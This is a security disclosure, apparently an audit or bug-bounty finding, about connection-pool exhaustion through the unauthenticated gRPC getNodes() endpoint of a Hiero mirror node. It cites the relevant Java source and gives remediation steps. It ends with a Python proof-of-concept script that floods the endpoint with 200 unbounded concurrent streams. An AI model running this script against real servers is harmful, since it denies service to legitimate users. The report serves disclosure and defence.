### Title
Unauthenticated gRPC `getNodes()` Enables Connection Pool Exhaustion via Unbounded Concurrent Paging

### Summary
The `getNodes()` endpoint in `NetworkController` accepts requests from any unauthenticated caller with no rate limiting. Each call drives repeated invocations of `page()` in `NetworkServiceImpl`, and every `page()` call synchronously acquires a JDBC connection from the shared `readOnly` `TransactionOperations` pool. An attacker opening many concurrent gRPC streams with `limit=0` can exhaust the connection pool, causing legitimate read transactions to queue or time out.

### Finding Description

**Code path:**

`NetworkController.getNodes()` (lines 33–43) accepts any `AddressBookQuery` with no authentication or rate-limiting check: [1](#0-0) 

It delegates to `NetworkServiceImpl.getNodes()`, which builds a `Flux` that calls `page()` repeatedly via `repeatWhen` until `context.isComplete()`, with a 250 ms delay between pages and `limit=0` meaning `Long.MAX_VALUE` items: [2](#0-1) 

Every iteration of `page()` calls `transactionOperations.execute(...)`, which synchronously acquires a JDBC connection from the pool, executes the query, and releases it: [3](#0-2) 

The `readOnly` `TransactionOperations` bean is a plain `TransactionTemplate` wrapping the shared `PlatformTransactionManager` — there is no dedicated or isolated pool for it: [4](#0-3) 

**Root cause:** No rate limiting, no per-IP throttling, and no authentication guard exists on the gRPC `getNodes()` path. The only gRPC interceptor present sets an endpoint-context label for table-usage tracking and provides zero access control: [5](#0-4) 

The throttle infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) lives exclusively in the `web3` module and is never wired into the `grpc` module.

**Why `maxConcurrentCallsPerConnection` is insufficient:** The Netty server limits concurrent calls to 5 *per connection*, not globally: [6](#0-5) 

An attacker simply opens many TCP connections (HTTP/2 multiplexing makes this cheap), each carrying 5 concurrent streams, yielding an unbounded total number of concurrent `getNodes()` calls.

**Why caching does not prevent connection acquisition:** Even when `AddressBookEntryRepository` returns a cached result, `transactionOperations.execute()` has already acquired a JDBC connection before the cache lookup occurs inside the lambda. The connection is held for the duration of the lambda regardless of whether the DB is actually queried.

### Impact Explanation
The shared HikariCP pool (default 10 connections in Spring Boot) is consumed by concurrent `page()` calls. Once exhausted, all other components sharing the same `PlatformTransactionManager` — including topic subscription queries and any other read paths — will block waiting for a connection or receive a connection-timeout exception. This degrades or denies service for all legitimate users of the mirror node gRPC API with no economic cost to the attacker.

### Likelihood Explanation
The attack requires only a gRPC client library (freely available) and network access to the mirror node's gRPC port. No credentials, tokens, or privileged access are needed. The attacker sends many concurrent `getNodes(limit=0)` requests across multiple TCP connections. The 250 ms `pageDelay` means each stream holds a connection slot briefly but repeatedly; with enough concurrent streams the aggregate demand continuously exceeds the pool size. This is trivially scriptable and repeatable. [7](#0-6) 

### Recommendation
1. **Add a global gRPC rate-limiting interceptor** in the `grpc` module (analogous to `ThrottleConfiguration` in `web3`) that enforces a per-IP and global requests-per-second ceiling on `getNodes()` calls.
2. **Enforce a maximum `limit`** in `AddressBookFilter` / `toFilter()` so that `limit=0` (unbounded) is not accepted from external callers, or cap it to a reasonable maximum (e.g., 1000).
3. **Isolate the read-only connection pool** by configuring a dedicated `DataSource` / HikariCP pool for the `readOnly` `TransactionTemplate`, preventing address-book paging from starving other read paths.
4. **Cap total concurrent gRPC calls globally** via `maxConcurrentCallsPerConnection` combined with a `maxConnectionAge` or a global semaphore, not just per-connection.

### Proof of Concept
```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from com.hedera.hashgraph.sdk.proto import basic_types_pb2
from hedera.mirror.api.proto import mirror_network_service_pb2 as pb

def flood():
    channel = grpc.insecure_channel("mirror-node-host:5600")
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    query = pb.AddressBookQuery(
        file_id=basic_types_pb2.FileID(file_num=102),
        limit=0  # unbounded — triggers Long.MAX_VALUE pages
    )
    try:
        for _ in stub.getNodes(query):
            pass  # consume stream slowly to keep connection alive
    except Exception:
        pass

# Open many connections, each with concurrent streams
threads = [threading.Thread(target=flood) for _ in range(200)]
for t in threads:
    t.start()
# Result: readOnly TransactionOperations pool exhausted;
# legitimate gRPC and other read transactions queue/timeout.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L68-76)
```java
        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L79-108)
```java
    private Flux<AddressBookEntry> page(AddressBookContext context) {
        return transactionOperations.execute(t -> {
            var addressBookTimestamp = context.getAddressBookTimestamp();
            var nodeStakeMap = context.getNodeStakeMap();
            var nextNodeId = context.getNextNodeId();
            var pageSize = addressBookProperties.getPageSize();
            var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(
                    addressBookTimestamp, nextNodeId, pageSize);
            var endpoints = new AtomicInteger(0);

            nodes.forEach(node -> {
                // Override node stake
                node.setStake(nodeStakeMap.getOrDefault(node.getNodeId(), 0L));
                // This hack ensures that the nested serviceEndpoints is loaded eagerly and voids lazy init exceptions
                endpoints.addAndGet(node.getServiceEndpoints().size());
            });

            if (nodes.size() < pageSize) {
                context.completed();
            }

            log.info(
                    "Retrieved {} address book entries and {} endpoints for timestamp {} and node ID {}",
                    nodes.size(),
                    endpoints,
                    addressBookTimestamp,
                    nextNodeId);
            return Flux.fromIterable(nodes);
        });
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L19-25)
```java
    @Bean
    @Qualifier("readOnly")
    TransactionOperations transactionOperationsReadOnly(PlatformTransactionManager transactionManager) {
        var transactionTemplate = new TransactionTemplate(transactionManager);
        transactionTemplate.setReadOnly(true);
        return transactionTemplate;
    }
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java (L13-22)
```java
public class GrpcInterceptor implements ServerInterceptor {

    @Override
    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(
            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
        final var methodName = fullMethod.substring(fullMethod.lastIndexOf('.') + 1);
        EndpointContext.setCurrentEndpoint(methodName);
        return next.startCall(call, headers);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/AddressBookProperties.java (L33-37)
```java
    @NotNull
    private Duration pageDelay = Duration.ofMillis(250L);

    @Min(1)
    private int pageSize = 10;
```
